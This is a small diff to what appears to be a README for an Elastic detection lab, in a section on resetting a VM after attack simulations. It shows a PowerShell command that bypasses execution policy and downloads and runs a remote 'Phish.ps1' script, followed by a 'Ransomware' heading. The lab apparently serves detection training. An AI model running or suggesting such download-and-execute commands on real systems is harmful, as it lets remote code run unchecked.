@@ -57,7 +57,6 @@ When you what to reset the VM or clean up after the attack just select the resta
 
 ```
 powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Scripts/Phish.ps1')"
-
 ```
   
 #### Ransomware ####
